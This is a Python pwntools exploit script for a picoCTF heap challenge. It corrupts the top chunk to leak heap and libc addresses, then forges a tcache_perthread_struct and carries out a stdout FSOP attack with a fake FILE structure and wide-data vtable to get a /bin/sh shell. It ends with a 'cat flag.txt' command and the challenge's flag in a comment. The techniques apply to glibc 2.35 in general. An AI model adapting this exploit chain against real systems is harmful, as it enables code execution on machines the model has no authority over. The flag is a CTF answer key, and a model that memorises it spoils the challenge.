#!/usr/bin/env python3
from pwn import *

PORT = 56816
HOST = "tethys.picoctf.net"
elf = context.binary = ELF('./hft_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000012BE
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def malloc(sz, msg=b""):
    p.recvuntil(b"PKT_RES]\n")
    p.send(p64(sz))
    p.sendline(p64(1) + msg)

# Stage 1: Leak libc

## Overwrite top chunk
malloc(0x10, b"A"*8 + p64(0xd51))

malloc(0x1000, b"")

p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x8))
p.send(b"\x01\x00\x00\x00\x00\x00\n")
p.recvuntil(b"PKT_DATA\x1b[m:[")
leak = p.recvuntil(b"]\n", drop=True)
heap_base = (u64(leak.ljust(8, b'\x00')) >> 12) << 12

## Fake tcache_perthread_struct on heap.
#* These constants are for the provided glibc 2.35 challenge layout.
pkt = 0x10
stri = pkt + 0x10

tcache_tls_off = 0x236f8
get_libc = -0x20

fill = tcache_tls_off + get_libc - stri
fill_h = tcache_tls_off + get_libc

libc_ptr_off = 0x560
fake_tcache_off = 0x2f0

# tcache_perthread_struct:
#   uint16_t counts[64]
#   tcache_entry *entries[64]
#

fake_tcache_addr = heap_base + fake_tcache_off

fake_tcache  = p16(0x30) * 64
fake_tcache += p64(heap_base + libc_ptr_off)
fake_tcache += p64(fake_tcache_addr - 0x10) * 10

malloc(0x280, fake_tcache)
malloc(0x22000, b"A"*fill_h + p64(fake_tcache_addr))
p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x10))
p.send(b"\x01\x00\x00\x00\x00\x00\n")
p.recvuntil(b"PKT_DATA\x1b[m:[")
leak = p.recvuntil(b"]\n", drop=True)
libc.address = u64(leak.ljust(8, b'\x00')) - 0x21a270

log.success(f"libc base = {hex(libc.address)}")

# Stage 2: FSOP with stdout

fake = FileStructure(0)

# This becomes useful for system("/bin/sh")
fake.flags = 0x3b01010101010101

fake._IO_read_end  = libc.sym.system
fake._IO_save_base = libc.address + 0x163850 # add rdi, 0x10 ; jmp rcx
fake._IO_write_end = u64(b"/bin/sh\x00")

fake._lock      = libc.sym._IO_stdfile_1_lock
fake._codecvt   = libc.sym._IO_2_1_stdout_ + 0xb8
fake._wide_data = libc.sym._IO_2_1_stdout_ + 0x200

fake.unknown2 = flat(
    0, 0,
    libc.sym._IO_2_1_stdout_ + 0x20,
    0, 0, 0,
    libc.sym._IO_wfile_jumps - 0x18 # fake vtable
)

FSOP_pl = p64(0) + bytes(fake)

## Fake new tcache

idx = 0x2c

counts = bytearray(0x80)
entries = bytearray(0x200)

counts[idx*2 : idx*2 + 2] = p16(1)
entries[idx*8 : idx*8 + 8] = p64(libc.sym._IO_2_1_stdout_ - 0x10)

new_fake_tcache = bytes(counts) + bytes(entries)

# GDB()
malloc(0x20, new_fake_tcache)
p.recvuntil(b"PKT_RES]\n")
p.send(p64(0x2d8))
p.sendline(FSOP_pl)

p.sendline(b'cat flag.txt') # picoCTF{mm4p_mm4573r_557ee1b7}
p.interactive()